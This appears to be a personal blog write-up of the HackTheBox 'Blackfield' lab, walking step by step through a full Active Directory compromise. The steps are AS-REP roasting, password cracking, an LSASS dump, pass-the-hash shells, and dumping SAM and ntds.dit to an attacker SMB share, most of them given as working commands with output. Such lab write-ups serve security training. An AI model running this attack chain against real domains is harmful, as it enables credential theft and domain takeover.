---
title: "HackTheBox - Blackfield"
author: Nasrallah
description: ""
date: 2025-07-19 07:00:00 +0000
categories : [HackTheBox, Machines]
tags: [hackthebox, windows, lsass, bloodhound, ad, secretsdump, diskshadow, asreproast, hashcat]
img_path: /assets/img/hackthebox/machines/blackfield
image:
    path: blackfield.png
---

<div align="center"> <script src="https://www.hackthebox.eu/badge/565048"></script> </div>

---

On [Blackfield](https://hacktheboxltd.sjv.io/Nasrallah?u=https://app.hackthebox.com/machines/blackfield) I start by dumping users and making a list to perform as-rep roasting attacking, we crack the hash of one user who can change the password of another user. The latter has read permission over a share where we find a lsass dump file, we extract a hash of one user who is part of `backup operators` group allowing us to make a shadow disk and get the ntds.dit file where we find the administrator's hash and rooting the box.

## **Enumeration**

### nmap

We start an Nmap scan using the following command: `sudo nmap -sC -sV -T4 {target_IP}`.

- -sC: run all the default scripts.

- -sV: Find the version of services running on the target.

- -T4: Aggressive scan to provide faster results.

```terminal
Nmap scan report for 10.10.10.192              
Host is up (0.11s latency).                    
Not shown: 993 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION           
53/tcp   open  domain        Simple DNS Plus   
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-07-16 00:19:25Z)
135/tcp  open  msrpc         Microsoft Windows RPC                  
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)                                                              
445/tcp  open  microsoft-ds?                   
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0    
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)                                                              
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
                                               
Host script results:                           
| smb2-time:
|   date: 2025-07-16T00:19:35                  
|_  start_date: N/A
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
|_clock-skew: 6h59m59s

```

The target is a domain controller with the domain `BLACKFIELD.local`, let's add it to `/etc/hosts`.

### SMB

Let's see what's on smb

```terminal
[★]$ nxc smb 10.10.10.192 -u 'guest' -p '' --shares                 
SMB         10.10.10.192    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)                           
SMB         10.10.10.192    445    DC01             [+] BLACKFIELD.local\guest:                  
SMB         10.10.10.192    445    DC01             [*] Enumerated shares                        
SMB         10.10.10.192    445    DC01             Share           Permissions     Remark       
SMB         10.10.10.192    445    DC01             -----           -----------     ------       
SMB         10.10.10.192    445    DC01             ADMIN$                          Remote Admin 
SMB         10.10.10.192    445    DC01             C$                              Default share
SMB         10.10.10.192    445    DC01             forensic                        Forensic / Audit share.
SMB         10.10.10.192    445    DC01             IPC$            READ            Remote IPC   
SMB         10.10.10.192    445    DC01             NETLOGON                        Logon server share
SMB         10.10.10.192    445    DC01             profiles$       READ
SMB         10.10.10.192    445    DC01             SYSVOL                          Logon server share  
```

The server allows guests to login, we found a share called `profiles$`

I spidered the share with `nxc` but there is nothing there.

Let's move on.

Next thing we can do it dump users on the server.

```bash
nxc smb 10.10.10.192 -u 'guest' -p '' --rid-brute
```

After clean up, we end up with the following four users.

```terminal
audit2020
support
svc_backup
lydericlefebvre
```

### AS-REP Roasting

Since we have a valid list of users, let's test for as-rep roasting.

```terminal
[★]$ GetNPUsers.py 'BLACKFIELD.local/' -usersfile users.txt -no-pass -dc-ip 10.10.10.192
/home/sirius/.local/pipx/venvs/impacket/lib/python3.11/site-packages/impacket/version.py:12: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_
resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.                                              
  import pkg_resources                                                                      
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies                       
                                                                                            
[-] User audit2020 doesn't have UF_DONT_REQUIRE_PREAUTH set                                 
$krb5asrep$23$support@BLACKFIELD.LOCAL:576fb233dc7d013e6b05af3066f3aa34$b4e37257db595eb5a1808c0a222c40f33a80bb1e2b7f0fc6bb304ab33e329fcfc2b9c39025936abba016a813b9affbfe1cf3224f22a720c8bf82d55ea7efb62fe14e967de5d41adf163f5caaf2aea9f97c162ece56abf7eb2be18aca5095a1f27e89862f45b63931013dedb5f6585e55dfe825597fa50c8fad4cdba54d1ab840226087c0ca8f07b10030baa36ba0251b8cc0c9f26303de95e8b974d08753df2abd41e3b3af87047cb0df33b30771f83b7a61bd69dd1389b0808d8bdc200f627f7b3ae189a59e4ec7457c72911bc7e61bb7e4575e91dabcd16cddbd66d5df1d234f195fe49bbd1f7079092668af7317227fb1ac8f 
```

We got a hit on user support, let's crack their hash.

```terminal
λ .\hashcat.exe hashes.txt rockyou.txt -m 18200


Dictionary cache hit:
* Filename..: rockyou.txt
* Passwords.: 14344384
* Bytes.....: 139921497
* Keyspace..: 14344384

$krb5asrep$23$support@BLACKFIELD.LOCAL:576fb233dc7d013e6b05af3066f3aa34$b4e37257db595eb5a1808c0a222c40f33a80bb1e2b7f0fc6bb304ab33e329fcfc2b9c39025936abba016a813b9affbfe1cf3224f22a720c8bf82d55ea7efb62fe14e967de5d41adf163f5caaf2aea9f97c162ece56abf7eb2be18aca5095a1f27e89862f45b63931013dedb5f6585e55dfe825597fa50c8fad4cdba54d1ab840226087c0ca8f07b10030baa36ba0251b8cc0c9f26303de95e8b974d08753df2abd41e3b3af87047cb0df33b30771f83b7a61bd69dd1389b0808d8bdc200f627f7b3ae189a59e4ec7457c72911bc7e61bb7e4575e91dabcd16cddbd66d5df1d234f195fe49bbd1f7079092668af7317227fb1ac8f:#00^BlackKnight

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)
Hash.Target......: $krb5asrep$23$support@BLACKFIELD.LOCAL:576fb233dc7d...b1ac8f
Time.Started.....: Tue Jul 15 18:23:25 2025 (33 secs)
Time.Estimated...: Tue Jul 15 18:23:58 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   434.4 kH/s (7.30ms) @ Accel:16 Loops:1 Thr:8 Vec:1
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 14340096/14344384 (99.97%)
Rejected.........: 0/14340096 (0.00%)
Restore.Point....: 14327808/14344384 (99.88%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: $CaRaMeL -> !carolyn

Started: Tue Jul 15 18:23:22 2025
Stopped: Tue Jul 15 18:23:58 2025
```

We got the password `#00^BlackKnight`

### Bloodhound

Let's run bloodhound-python.

```bash
bloodhound-ce-python -u support -p '#00^BlackKnight' -d BLACKFIELD.local -dc BLACKFIELD.local -ns 10.10.10.192 -c all
```

After loading the files to bloodhound, we need to search for our user `support` and see what type of permissions they have.

![blood](1.png)

Our user can change the password of `audit2020`. We can use the following command for that.

```bash
net rpc password "audit2020" "newP@ssword2025" -U "BLACKFIELD.local"/"support"%"#00^BlackKnight" -S "BLACKFIELD.local"
```

Now let's check if we can access any more shares.

```terminal
[★]$ nxc smb 10.10.10.192 -u audit2020 -p 'newP@ssword2025' --shares
SMB         10.10.10.192    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)                           
SMB         10.10.10.192    445    DC01             [+] BLACKFIELD.local\audit2020:newP@ssword2025                                                                              
SMB         10.10.10.192    445    DC01             [*] Enumerated shares
SMB         10.10.10.192    445    DC01             Share           Permissions     Remark
SMB         10.10.10.192    445    DC01             -----           -----------     ------
SMB         10.10.10.192    445    DC01             ADMIN$                          Remote Admin                                                                           
SMB         10.10.10.192    445    DC01             C$                              Default share  
SMB         10.10.10.192    445    DC01             forensic        READ            Forensic / Audit share.      
SMB         10.10.10.192    445    DC01             IPC$            READ            Remote IPC
SMB         10.10.10.192    445    DC01             NETLOGON        READ            Logon server share
SMB         10.10.10.192    445    DC01             profiles$       READ
SMB         10.10.10.192    445    DC01             SYSVOL          READ            Logon server share 
```

We can now read the `forensic` share. I'll spider it with nxc and check the results.

```terminal
nxc smb 10.10.10.192 -u audit2020 -p 'newP@ssword2025' --share forensic -M spider_plus

"forensic": {
    "memory_analysis/lsass.zip": {
            "atime_epoch": "2020-05-28 20:25:08",
            "ctime_epoch": "2020-05-28 20:25:01",
            "mtime_epoch": "2020-05-28 20:29:24",
            "size": "39.99 MB"
        },
{
```

Out of all the files, the lsass sounds very interesting to me as it's in a folder called `memory_analysis` so this could be a dump of the lsass.

### LSASS

Let's download the file.

```bash
smbclient //10.10.10.192/forensic -U audit2020%'newP@ssword2025' -c 'get memory_analysis\lsass.zip' -t 120                                                                           
getting file \memory_analysis\lsass.zip of size 41936098 as memory_analysis\lsass.zip (475.1 KiloBytes/sec) (average 475.1 KiloBytes/sec)
```

After unziping the file we confirm it's indeed a dump file of lsass.

```terminal
[★]$ unzip lsass.zip                               
Archive:  lsass.zip
  inflating: lsass.DMP               
  [★]$ ls -la
total 180648
drwxr-xr-x 1 sirius sirius        36 Jul 15 19:12 .
drwxr-xr-x 1 sirius sirius        82 Jul 15 19:12 ..
-rw-r--r-- 1 sirius sirius 143044222 Feb 23  2020 lsass.DMP
-rw-r--r-- 1 sirius sirius  41936098 Jul 15 19:12 lsass.zip

```

We can use `pypykatz` to extract password hashes.

```terminal
[★]$ pypykatz lsa minidump lsass.DMP                                                        
INFO:pypykatz:Parsing file lsass.DMP
FILE: ======== lsass.DMP =======
== LogonSession ==
authentication_id 406458 (633ba)
session_id 2
username svc_backup
domainname BLACKFIELD
logon_server DC01
logon_time 2020-02-23T18:00:03.423728+00:00
sid S-1-5-21-4194615774-2175524697-3563712290-1413
luid 406458
        == MSV ==
                Username: svc_backup
                Domain: BLACKFIELD
                LM: NA
                NT: 9658d1d1dcd9250115e2205d9f48400d
                SHA1: 463c13a9a31fc3252c68ba0a44f0221626a33e5c
                DPAPI: a03cd8e9d30171f3cfe8caad92fef62100000000

```

We got the ntlm hash of user `svc_backup`.

## **Foothold**

Let's see what user `svc_backup` can do.

![backup](2.png)

The user is part of the `Remote Management Users` and that can give us a shell via winrm.

```terminal
[★]$ evil-winrm -i 10.10.10.192 -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d           

Evil-WinRM shell v3.5                          
                                         
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                         
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                         
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\svc_backup\Documents>
```

We also saw that the user is part of `backup operators` group, which would allows us to read sam and system files.

```terminal
*Evil-WinRM* PS C:\Users\svc_backup\desktop> reg save HKLM\system .\system     
The operation completed successfully.

*Evil-WinRM* PS C:\Users\svc_backup\desktop> reg save HKLM\sam .\sam
The operation completed successfully.

*Evil-WinRM* PS C:\Users\svc_backup\desktop> copy sam \\10.10.16.18\share
*Evil-WinRM* PS C:\Users\svc_backup\desktop> copy system \\10.10.16.18\share
```

After sending the files to our machine we can extract hashes with `secretsdump`

```terminal
[★]$ secretsdump.py -sam sam -system system local
/home/sirius/.local/pipx/venvs/impacket/lib/python3.11/site-packages/impacket/version.py:12: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
  import pkg_resources
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0x73d83e56de8961ca9f243e1a49638393
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:67ef902eae0d740df6257f273de75051:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[-] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn't have hash information.
[*] Cleaning up... 
```

We got the local administrator hash, but trying the login with it fails.

## **Privilege Escalation**

On the c drive we find the following note.

```terminal
Mates,

After the domain compromise and computer forensic last week, auditors advised us to:
- change every passwords -- Done.
- change krbtgt password twice -- Done.
- disable auditor's account (audit2020) -- KO.
- use nominative domain admin accounts instead of this one -- KO.

We will probably have to backup & restore things later.
- Mike.

PS: Because the audit report is sensitive, I have encrypted it on the desktop (root.txt)
```

Since we couldn't find anything on sam, let's get ntds.dit file instead.

### DiskShadow

First, let's run the following commands to create text file with the necessary commands that will be used by diskshadow.exe to create a shadow disk

```shell
echo "set context persistent nowriters" | out-file C:/windows/temp/diskshadow.txt -encoding ascii
echo "add volume c: alias temp" | out-file C:/windows/temp/diskshadow.txt -encoding ascii -append
echo "create" | out-file C:/windows/temp/diskshadow.txt -encoding ascii -append        
echo "expose %temp% z:" | out-file C:/windows/temp/diskshadow.txt -encoding ascii -append
```

Now let's pass the file to `diskshadow`

```powershell
diskshadow.exe /s C:\windows\temp\diskshadow.txt
```

```terminal
*Evil-WinRM* PS C:\windows\temp> diskshadow.exe /s c:\windows\temp\diskshadow.txt     
Microsoft DiskShadow version 1.0
Copyright (C) 2013 Microsoft Corporation
On computer:  DC01,  7/15/2025 8:16:14 PM                                                      
                                                                                               
-> set context persistent nowriters                                                            
-> add volume c: alias temp                                                                    
-> create                                                                                      
Alias temp for shadow ID {5ec1bfb7-7229-4f02-b4ac-2245835c57c3} set as environment variable.   
Alias VSS_SHADOW_SET for shadow set ID {b3254cfe-7a33-4f4a-aade-1f403cf2e8a3} set as environment variable.                                                                                    

Querying all shadow copies with the shadow copy set ID {b3254cfe-7a33-4f4a-aade-1f403cf2e8a3}                                                                                                 

        * Shadow copy ID = {5ec1bfb7-7229-4f02-b4ac-2245835c57c3}               %temp%
                - Shadow copy set: {b3254cfe-7a33-4f4a-aade-1f403cf2e8a3}       %VSS_SHADOW_SET%                                                                                              
                - Original count of shadow copies = 1
                - Original volume name: \\?\Volume{6cd5140b-0000-0000-0000-602200000000}\ [C:\]                                                                                               
                - Creation time: 7/15/2025 8:16:16 PM                                          
                - Shadow copy device name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1                                                                                                    
                - Originating machine: DC01.BLACKFIELD.local
                - Service machine: DC01.BLACKFIELD.local
                - Not exposed
                - Provider ID: {b5946137-7b9f-4925-af80-51abd60b20d5}
                - Attributes:  No_Auto_Release Persistent No_Writers Differential

Number of shadow copies listed: 1
-> expose %temp% z:
-> %temp% = {5ec1bfb7-7229-4f02-b4ac-2245835c57c3}
The shadow copy was successfully exposed as z:\.

```

We have successfully created a shadow copy of c in a drive called z.

Let's copy ndts.dit.

```bash
robocopy "z:\windows\ndts\" "C:\Users\svc_backup\desktop" ndts.dit /B
```

Now let's download it to our machine.

```bash
copy ntds.dit \\10.10.16.18\share
```

Since we already have the system file, let's dump the data with `secretsdump`

```terminal
secretsdump.py -ntds ntds.dit -system system local                    
/home/sirius/.local/pipx/venvs/impacket/lib/python3.11/site-packages/impacket/version.py:12: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_
resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.                                              
  import pkg_resources                                                         
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies          
                                                                               
[*] Target system bootKey: 0x73d83e56de8961ca9f243e1a49638393                  
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)                  
[*] Searching for pekList, be patient                                          
[*] PEK # 0 found and decrypted: 35640a3fd5111b93cc50e3b4e255ff8c              
[*] Reading and decrypting hashes from ntds.dit                                
Administrator:500:aad3b435b51404eeaad3b435b51404ee:184fb5e5178480be64824d4cd53b99ee:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: 
DC01$:1000:aad3b435b51404eeaad3b435b51404ee:5b96daeeb18ac242f33cc91822dea527:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:d3c02561bba6ee4ad6cfd024ec8fda5d:::
audit2020:1103:aad3b435b51404eeaad3b435b51404ee:600a406c2c1f2062eb9bb227bad654aa:::
support:1104:aad3b435b51404eeaad3b435b51404ee:cead107bf11ebc28b3e6e90cde6de212:::
```

We got the administrator's hash, let's get a shell.

```terminal
[★]$ evil-winrm -i 10.10.10.192 -u administrator -H 184fb5e5178480be64824d4cd53b99ee
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> 
```

---

Thank you for taking the time to read my write-up, I hope you have learned something from this. If you have any questions or comments, please feel free to reach out to me. See you in the next hack :).
